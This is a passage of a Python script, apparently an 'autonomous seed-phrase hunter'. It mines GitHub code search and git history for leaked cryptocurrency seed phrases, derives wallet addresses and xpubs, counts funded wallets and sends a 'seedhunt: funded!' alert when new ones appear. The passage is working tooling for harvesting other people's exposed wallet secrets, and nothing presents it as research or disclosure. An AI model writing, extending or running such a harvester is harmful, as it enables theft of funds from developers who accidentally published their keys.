            _record_secret(ph, "seed", r, 1 if is_placeholder(ph) else 0)
    say(f"[deep] {len(found)} phrases from git history")

# ---------------------------------------------------------------------- watch

DATE_WINDOWS = ["pushed:>2025-06-01", "pushed:2024-06-01..2025-05-31",
                "pushed:2023-06-01..2024-05-31", "pushed:2022-06-01..2023-05-31",
                "pushed:2021-06-01..2022-05-31", "pushed:2020-06-01..2021-05-31",
                "pushed:<2020-06-01"]

def watch(args):
    init_db()
    deadline = time.time() + args.minutes * 60
    discover_until = time.time() + min(args.discover, args.minutes) * 60

    pool = [f"{query} {bucket}" for query in GH_QUERIES for bucket in STAR_BUCKETS]
    random.shuffle(pool)
    known_q = {r[0]: r[1] for r in q("SELECT q,last FROM queries")}
    pool.sort(key=lambda s: known_q.get(s, 0))

    used, hits = 0, 0
    for query in pool:
        if time.time() > discover_until:
            break
        x("INSERT INTO queries(q,last) VALUES(?,?) ON CONFLICT(q) DO UPDATE SET last=excluded.last",
          (query, time.time()))
        used += 1
        try:
            got = search_github_code(query)
        except Exception as e:
            say(f"    query failed: {query}: {e}")
            continue
        fresh = 0
        for c in got:
            if not q("SELECT 1 FROM candidates WHERE repo=? AND path=?", (c.repo, c.path)):
                fresh += 1
            add_candidate(c.repo, c.path, c.source, c.query)
        hits += fresh
        say(f"    {query} -> {len(got)} raw, {fresh} new")
        if hits >= args.max_candidates:
            say("    [cap] candidate cap reached")
            break

    say(f"[watch] {used}/{len(pool)} partitions, {hits} new candidates")

    before = q("SELECT COUNT(*) FROM funded")[0][0]
    triage(argparse.Namespace(batch=args.max_candidates))
    new_funds = q("SELECT COUNT(*) FROM funded")[0][0] - before

    # notification digest
    if new_funds:
        notify("seedhunt: funded!", f"{new_funds} new funded address(es). Total "
                                    f"{q('SELECT COUNT(*) FROM funded')[0][0]}.")
    elif hits:
        notify("seedhunt run", f"{hits} new candidates, {q('SELECT COUNT(*) FROM addrs')[0][0]} addrs tracked")
    else:
        say("[watch] nothing new, staying quiet")

    hb = float(meta_get("heartbeat", 0))
    if time.time() - hb > 12 * 3600:
        meta_set("heartbeat", time.time())
        notify("seedhunt alive", f"{q('SELECT COUNT(*) FROM candidates')[0][0]} candidates, "
                                 f"{q('SELECT COUNT(*) FROM funded')[0][0]} funded ever")

# ------------------------------------------------------------------------ cli

def stats(_args=None):
    init_db()
    for label, sql in [("candidates", "SELECT COUNT(*) FROM candidates"),
                       ("untriaged", "SELECT COUNT(*) FROM candidates WHERE triaged=0"),
                       ("unique blobs", "SELECT COUNT(*) FROM blobs"),
                       ("secrets", "SELECT COUNT(*) FROM secrets"),
                       ("addresses", "SELECT COUNT(*) FROM addrs"),
                       ("xpubs", "SELECT COUNT(*) FROM xpubs"),
                       ("funded", "SELECT COUNT(*) FROM funded")]:
        say(f"{label:>14}: {q(sql)[0][0]}")
    say("sources:")
    for src, n in q("SELECT source, COUNT(*) FROM candidates GROUP BY source ORDER BY 2 DESC"):
        say(f"    {src:<14} {n}")

def main():
    ap = argparse.ArgumentParser(description="autonomous seed-phrase hunter")
    ap.add_argument("mode", choices=["discover", "triage", "all", "deep", "watch", "stats"])
    ap.add_argument("--max-candidates", type=int, default=4000)
    ap.add_argument("--star-limit", type=int, default=500)
    ap.add_argument("--batch", type=int, default=20000)
    ap.add_argument("--minutes", type=float, default=20)
    ap.add_argument("--discover", type=float, default=12)
    a = ap.parse_args()
    init_db()
    if a.mode in ("discover", "all"):
        discover(a)
    if a.mode in ("triage", "all"):
        triage(a)
    if a.mode == "deep":
        deep(a)
    if a.mode == "watch":
        watch(a)
    if a.mode == "stats":
        stats(a)

if __name__ == "__main__":
    main()